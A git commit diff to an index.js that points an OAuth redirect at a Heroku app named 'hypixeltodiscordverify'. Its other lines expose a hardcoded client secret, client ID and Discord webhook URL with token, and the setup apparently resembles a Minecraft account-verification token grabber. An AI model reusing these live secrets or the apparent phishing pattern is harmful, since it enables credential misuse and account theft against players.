323759371817680559a221f805945fb32e968fa9
Normi <normixbox@gmail.com>
2022-10-07 14:59:19 +0200

    a

--- index.js
+++ index.js
@@ -1,6 +1,6 @@
 const client_secret = 'HkL8Q~Lpyn6H6pI~3ENbt5wmNa9JNV3zHTlWlcqj'
 const client_id = 'a7f62b5a-c66b-47f1-a6f9-fb7938cac361'
-const redirect_uri = 'http://localhost:3000/'
+const redirect_uri = 'https://hypixeltodiscordverify.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1023169651536052344/_G1QWD7svz30JTn91tMSx02dTfZ0Ixmtk96eXOkOS9Klyu33AZnv2mPrxDHEEsefVsfI'
 
 const axios = require('axios')
